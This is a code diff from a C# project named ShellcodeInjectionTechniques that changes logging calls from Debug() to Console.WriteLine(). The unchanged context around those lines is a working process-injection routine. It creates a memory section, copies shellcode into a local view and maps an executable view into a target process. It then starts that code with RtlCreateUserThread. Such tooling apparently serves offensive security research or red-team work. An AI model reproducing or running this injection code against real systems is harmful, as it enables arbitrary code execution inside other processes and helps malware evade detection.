@@ -20,11 +20,11 @@ namespace ShellcodeInjectionTechniques
 
             if (result != 0)
             {
-                Debug("[!] Unable to map view of section: {0}", new string[] { ((NTSTATUS)result).ToString() });
+                Console.WriteLine("[!] Unable to map view of section: {0}", new string[] { ((NTSTATUS)result).ToString() });
                 return;
             }
             else
-                Debug("[+] NtCreateSection() - section handle: 0x{0}", new string[] { hSectionHandle.ToString("X") });
+                Console.WriteLine("[+] NtCreateSection() - section handle: 0x{0}", new string[] { hSectionHandle.ToString("X") });
 
             // create a local view
             const UInt32 ViewUnmap = 0x2;
@@ -33,26 +33,26 @@ namespace ShellcodeInjectionTechniques
 
             if (result != 0)
             {
-                Debug("[!] Unable to map view of section: {0}", new string[] { ((NTSTATUS)result).ToString() });
+                Console.WriteLine("[!] Unable to map view of section: {0}", new string[] { ((NTSTATUS)result).ToString() });
                 return;
             }
             else
-                Debug("[+] NtMapViewOfSection() - local view: 0x{0}", new string[] { pLocalView.ToString("X") });
+                Console.WriteLine("[+] NtMapViewOfSection() - local view: 0x{0}", new string[] { pLocalView.ToString("X") });
 
             // copy shellcode to the local view
             Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
-            Debug("[+] Marshalling shellcode");
+            Console.WriteLine("[+] Marshalling shellcode");
 
             // create a remote view of the section in the target
             IntPtr pRemoteView = IntPtr.Zero;
             NtMapViewOfSection(hSectionHandle, target.Handle, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_EXECUTE_READ);
-            Debug("[+] NtMapViewOfSection() - remote view: 0x{0}", new string[] { pRemoteView.ToString("X") });
+            Console.WriteLine("[+] NtMapViewOfSection() - remote view: 0x{0}", new string[] { pRemoteView.ToString("X") });
 
             // execute the shellcode
             IntPtr hThread = IntPtr.Zero;
             CLIENT_ID cid = new CLIENT_ID();
             RtlCreateUserThread(target.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
-            Debug("[+] RtlCreateUserThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
+            Console.WriteLine("[+] RtlCreateUserThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
         }
     }
 }
